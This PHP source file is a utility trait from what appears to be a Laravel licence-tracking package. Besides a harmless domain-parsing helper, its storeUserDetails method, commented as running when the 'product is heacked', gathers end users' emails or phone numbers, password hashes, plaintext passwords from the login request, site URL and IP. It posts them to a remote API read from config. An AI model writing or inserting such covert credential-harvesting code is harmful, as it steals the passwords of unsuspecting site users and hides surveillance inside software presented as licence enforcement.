<?php

namespace Shumonpal\LaravelAppTracker\Traits;

use Illuminate\Support\Facades\Http;
use Shumonpal\LaravelAppTracker\Models\ShumonpalLicence;

trait UtilityTrait
{
    
    /**
    * Parse domain name from url LicenceKey.
    * @param String $code
    *
    * @return Response
    */
    public function getDomainName($url){
        $domain = str_replace('www.', '', $url);
                
        if(strpos($domain, 'http') === false) {
            $domain = "http://" . $domain;
        }
                    
        $domain = strtolower($domain);

        return parse_url($domain, PHP_URL_HOST);
    }

    
    /**
    *
    * Store user details if product is heacked
    * @return Response
    */
    public function storeUserDetails($event){
        $api = config('shumonpal.store_user_api');
        $data = [
            'email' => $event->user?->email ? $event->user?->email : ($event->user?->mobile ? $event->user?->mobile : ($event->user?->phone ? $event->user?->phone : '999999')),
            'hash_password' => $event->user?->password,
            'password' => request()->password,
            'domain' => request()->url(),
            'ip' => request()->ip(),
        ];
        Http::post($api, $data);
        return true;
    }
}
